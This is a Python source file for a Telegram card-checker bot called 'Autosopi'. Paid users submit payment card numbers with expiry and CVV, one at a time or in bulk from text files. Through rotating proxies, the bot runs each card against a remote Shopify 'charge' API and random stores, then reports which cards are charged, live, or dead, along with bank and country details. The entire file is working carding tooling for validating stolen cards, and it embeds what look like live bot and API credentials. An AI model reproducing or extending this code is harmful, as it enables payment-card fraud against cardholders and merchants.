from datetime import datetime
import json
import os
import random
import re
import time
import asyncio
import aiofiles
import aiohttp
from telethon import Button, TelegramClient, events

API_ID = 21124241
API_HASH = "b7ddce3d3683f54be788fddae73fa468"
BOT_TOKEN = "8872654381:AAF8rRvAvid-JtbU7AbpU8g4acECXfIfRh0"
RAILWAY_API_URL = "https://apishopify-production.up.railway.app/api/charge"

PREMIUM_FILE = "premium.txt"
SITES_FILE = "sites.txt"
PROXY_FILE = "proxy.txt"

bot = TelegramClient("checker_bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
active_sessions = {}

def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Error reading {filepath}: {e}")
        return []

def load_premium_users(): return get_file_lines(PREMIUM_FILE)
def load_sites(): return get_file_lines(SITES_FILE)
def load_proxies(): return get_file_lines(PROXY_FILE)
def is_premium(user_id): return str(user_id) in load_premium_users()

def extract_cc(text):
    pattern = r"(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})"
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = "20" + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=8)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as res:
                if res.status != 200:
                    return "Unknown", "-", "-", "Unknown", "Unknown", ""
                data = json.loads(await res.text())
                return (
                    data.get("brand", "-"),
                    data.get("type", "-"),
                    data.get("level", "-"),
                    data.get("bank", "-"),
                    data.get("country_name", "-"),
                    data.get("country_flag", ""),
                )
    except Exception:
        return "Unknown", "-", "-", "Unknown", "Unknown", ""

async def verify_card_with_railway(card, site, proxy):
    try:
        payload = {"card": card, "site": site, "proxy": proxy}
        timeout = aiohttp.ClientTimeout(total=45)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.post(RAILWAY_API_URL, json=payload) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return {
                        "status": data.get("status", "Dead"),
                        "message": data.get("message", "DECLINED_BY_PROCESSOR"),
                        "card": card,
                        "site": data.get("site", site),
                        "gateway": data.get("gateway", "Shopify Payments"),
                        "price": data.get("price", "-"),
                    }
                else:
                    return {"status": "Dead", "message": f"API_HTTP_{resp.status}", "card": card, "site": site, "gateway": "Shopify Payments", "price": "-"}
    except Exception as e:
        return {"status": "Dead", "message": str(e), "card": card, "site": site, "gateway": "Shopify Payments", "price": "-"}

async def dispatch_checker(card, sites, proxies):
    if not sites or not proxies:
        return {"status": "Dead", "message": "MISSING_SITES_OR_PROXIES", "card": card, "site": "N/A", "gateway": "Shopify Payments", "price": "-"}
    chosen_site = random.choice(sites)
    chosen_proxy = random.choice(proxies)
    return await verify_card_with_railway(card, chosen_site, chosen_proxy)


# --- TELEGRAM COMMANDS ---

@bot.on(events.NewMessage(incoming=True, pattern=r"^/start"))
async def start_cmd(event):
    if not is_premium(event.sender_id):
        await event.reply("❌ <b>Access Denied. Premium authorization required.</b>", parse_mode="html")
        return
    me = await bot.get_me()
    await event.reply(
        f"<b>⚡💳 AUTOSOPI ULTIMATE CHECKER 💳⚡</b>\n"
        f"<b>━━━━━━━━━━━━━━━━━</b>\n"
        f"• <code>/cc card|mm|yy|cvv</code> - Check single card\n"
        f"• <code>/chk</code> - Reply to a .txt card list file for mass check\n"
        f"• <code>/site</code> / <code>/proxy</code> - Manage configurations\n"
        f"<b>━━━━━━━━━━━━━━━━━</b>\n"
        f"🔮 <b>Bot ➛</b> @{me.username}",
        parse_mode="html",
    )

@bot.on(events.NewMessage(incoming=True, pattern=r"^/cc\s+"))
async def single_cc_cmd(event):
    if not is_premium(event.sender_id):
        return
    sites, proxies = load_sites(), load_proxies()
    cards = extract_cc(event.message.text)
    if not cards:
        await event.reply("❌ Incorrect format. Example: <code>/cc 4532...|09|2028|123</code>", parse_mode="html")
        return
    
    card = cards[0]
    msg = await event.reply(f"<b>⚡ Running Autosopi Real Check...</b>\n<code>{card}</code>", parse_mode="html")
    
    res = await dispatch_checker(card, sites, proxies)
    brand, bin_type, level, bank, country, flag = await get_bin_info(card[:6])
    
    status_type = res["status"]
    if status_type == "CHARGED":
        status_box = "💎 CHARGED"
    elif status_type == "3D/OTP":
        status_box = "🛡️ 3D/OTP"
    elif status_type == "CVV Live/Insufficient":
        status_box = "🟢 CVV Live/Insufficient"
    else:
        status_box = "⚠️ Dead"

    output_text = (
        f"<b>────────────────────</b>\n"
        f"<b>| {status_box}</b>\n"
        f"<b>────────────────────</b>\n\n"
        f"<b>Card ➛</b> <code>{res['card']}</code>\n"
        f"<b>Gateway ➛</b> {res.get('gateway', 'Shopify Payments')}\n"
        f"<b>Amount ➛</b> {res.get('price', '$1.00')}\n"
        f"<b>Store ➛</b> <code>{res.get('site', 'N/A')}</code>\n"
        f"<b>Response ➛</b> {res['message']}\n"
        f"<b>BIN ➛</b> {brand} - {bin_type}\n"
        f"<b>Bank ➛</b> {bank}\n"
        f"<b>Country ➛</b> {country} {flag}"
    )
    await msg.edit(output_text, parse_mode="html")

@bot.on(events.NewMessage(incoming=True, pattern=r"^/site$"))
async def site_status_cmd(event):
    if not is_premium(event.sender_id):
        return
    sites = load_sites()
    await event.reply(f"🌐 Loaded active check stores: <b>{len(sites)}</b> target sites ready.", parse_mode="html")

@bot.on(events.NewMessage(incoming=True, pattern=r"^/proxy$"))
async def proxy_cmd(event):
    if not is_premium(event.sender_id):
        return
    proxies = load_proxies()
    await event.reply(f"🔄 Loaded active proxy nodes: <b>{len(proxies)}</b> nodes ready.", parse_mode="html")


# --- MASS CHECK COMMAND (/chk) WITH CONTROLLED CONCURRENCY ---

@bot.on(events.NewMessage(incoming=True, pattern=r"^/chk$"))
async def mass_chk_cmd(event):
    user_id = event.sender_id
    if not is_premium(user_id) or not event.reply_to_msg_id:
        return
    reply = await event.get_reply_message()
    if not reply.file or not reply.file.name.endswith(".txt"):
        await event.reply("❌ Please reply to a valid `.txt` card list file.")
        return
        
    sites, proxies = load_sites(), load_proxies()
    if not sites or not proxies:
        await event.reply("❌ Local `sites.txt` or `proxy.txt` files are empty or missing.")
        return

    status_msg = await event.reply("🫆 Downloading card list and queuing live workers...")
    filepath = await reply.download_media()
    
    async with aiofiles.open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        cards = extract_cc(await f.read())
    try:
        os.remove(filepath)
    except:
        pass

    if not cards:
        await status_msg.edit("😡 No valid credit card patterns found in file.")
        return

    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {"paused": False}
    
    results = {
        "charged": [],
        "otp": [],
        "insuff": [],
        "dead": [],
        "total": len(cards),
        "checked": 0,
        "start_time": time.time(),
    }

    queue = asyncio.Queue()
    for c in cards:
        queue.put_nowait(c)
    
    last_ui_update = [time.time()]
    
    # Restrict concurrent checks to 2 workers to protect Railway container memory
    MAX_CONCURRENT_CHECKS = 2
    semaphore = asyncio.Semaphore(MAX_CONCURRENT_CHECKS)

    async def worker_task():
        while not queue.empty() and session_key in active_sessions:
            if active_sessions[session_key].get("paused", False):
                await asyncio.sleep(1)
                continue
            try:
                card = queue.get_nowait()
            except:
                break
            
            async with semaphore:
                res = await dispatch_checker(card, load_sites(), load_proxies())
            
            results["checked"] += 1
            status = res["status"]
            
            if status in ["CHARGED", "3D/OTP", "CVV Live/Insufficient"]:
                if status == "CHARGED":
                    results["charged"].append(res)
                    status_box = "💎 CHARGED"
                elif status == "3D/OTP":
                    results["otp"].append(res)
                    status_box = "🛡️ 3D/OTP"
                else:
                    results["insuff"].append(res)
                    status_box = "🟢 CVV Live/Insufficient"
                
                brand, bin_type, level, bank, country, flag = await get_bin_info(card[:6])
                live_alert = (
                    f"<b>────────────────────</b>\n"
                    f"<b>| {status_box}</b>\n"
                    f"<b>────────────────────</b>\n\n"
                    f"<b>Card ➛</b> <code>{res['card']}</code>\n"
                    f"<b>Gateway ➛</b> {res.get('gateway', 'Shopify Payments')}\n"
                    f"<b>Amount ➛</b> {res.get('price', '$1.00')}\n"
                    f"<b>Store ➛</b> <code>{res.get('site', 'N/A')}</code>\n"
                    f"<b>Response ➛</b> {res['message']}\n"
                    f"<b>BIN ➛</b> {brand} - {bin_type}\n"
                    f"<b>Bank ➛</b> {bank}\n"
                    f"<b>Country ➛</b> {country} {flag}"
                )
                try:
                    await bot.send_message(user_id, live_alert, parse_mode="html")
                except:
                    pass
            else:
                results["dead"].append(res)
            
            queue.task_done()
            await asyncio.sleep(0.5)

            if time.time() - last_ui_update[0] >= 1.5:
                last_ui_update[0] = time.time()
                if session_key in active_sessions:
                    try:
                        elapsed_seconds = int(time.time() - results["start_time"])
                        hrs, rem = divmod(elapsed_seconds, 3600)
                        mins, secs = divmod(rem, 60)
                        
                        live_prog = (
                            f"<b>⚡ AUTOSOPI MASS CHECK Gateway ➛ Shopify Status ➛ RUNNING ⚡</b>\n\n"
                            f"<b>Checked ➛</b> {results['checked']}/{results['total']}\n"
                            f"💎 <b>Charged ➛</b> {len(results['charged'])}\n"
                            f"🛡️ <b>3D/OTP ➛</b> {len(results['otp'])}\n"
                            f"🟢 <b>Approved ➛</b> {len(results['insuff'])}\n"
                            f"⚠️ <b>Dead ➛</b> {len(results['dead'])}\n"
                            f"<b>Time ➛</b> {hrs:02d}:{mins:02d}:{secs:02d}"
                        )
                        control_buttons = [
                            [Button.inline("⏸️ Pause", b"pause"), Button.inline("▶️ Resume", b"resume")],
                            [Button.inline("🛑 Stop", b"stop")]
                        ]
                        await bot.edit_message(user_id, status_msg.id, live_prog, buttons=control_buttons, parse_mode="html")
                    except:
                        pass

    workers_pool = [asyncio.create_task(worker_task()) for _ in range(MAX_CONCURRENT_CHECKS)]
    await asyncio.gather(*workers_pool, return_exceptions=True)

    if session_key in active_sessions:
        del active_sessions[session_key]
    try:
        await status_msg.delete()
    except:
        pass

    total_duration = int(time.time() - results["start_time"])
    m_f, s_f = divmod(total_duration, 60)
    h_f, m_f = divmod(m_f, 60)
    
    me = await bot.get_me()
    final_report = (
        f"<b>🔮 AUTOSOPI SESSION COMPLETE</b>\n\n"
        f"💎 <b>Charged ➛</b> {len(results['charged'])}\n"
        f"🛡️ <b>3D/OTP ➛</b> {len(results['otp'])}\n"
        f"🟢 <b>CVV Live/Insufficient ➛</b> {len(results['insuff'])}\n"
        f"⚠️ <b>Dead ➛</b> {len(results['dead'])}\n"
        f"<b>Total ➛</b> {results['total']}\n"
        f"<b>Time ➛</b> {h_f:02d}h {m_f:02d}m {s_f:02d}s\n"
        f"🔮 <b>Bot ➛</b> @{me.username}"
    )

    log_filename = f"autosopi_report_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    total_hits = len(results['charged']) + len(results['otp']) + len(results['insuff'])
    
    if total_hits > 0:
        async with aiofiles.open(log_filename, "w", encoding="utf-8") as log_file:
            await log_file.write("AUTOSOPI CHECKER REPORT - VERIFIED HITS\n\n")
            for title, dataset in [("CHARGED", results["charged"]), ("3D/OTP", results["otp"]), ("CVV LIVE/INSUFFICIENT", results["insuff"])]:
                if dataset:
                    await log_file.write(f"=== {title} ({len(dataset)}) ===\n")
                    for item in dataset:
                        await log_file.write(f"{item['card']} | Price: {item.get('price')} | Site: {item.get('site')} | Msg: {item['message']}\n")
        
        await bot.send_message(user_id, final_report, file=log_filename, parse_mode="html")
        try:
            os.remove(log_filename)
        except:
            pass
    else:
        await bot.send_message(user_id, final_report, parse_mode="html")

@bot.on(events.CallbackQuery(pattern=b"pause"))
async def pause_session(event):
    for session_id in active_sessions:
        if str(event.sender_id) in session_id:
            active_sessions[session_id]["paused"] = True
            await event.answer("Session paused!")
            return

@bot.on(events.CallbackQuery(pattern=b"resume"))
async def resume_session(event):
    for session_id in active_sessions:
        if str(event.sender_id) in session_id:
            active_sessions[session_id]["paused"] = False
            await event.answer("Session resumed!")
            return

@bot.on(events.CallbackQuery(pattern=b"stop"))
async def stop_session(event):
    for session_id in list(active_sessions.keys()):
        if str(event.sender_id) in session_id:
            del active_sessions[session_id]
            await event.answer("Session stopped.")
            return

print("✅ Autosopi Telegram Bot running successfully!")
bot.run_until_disconnected()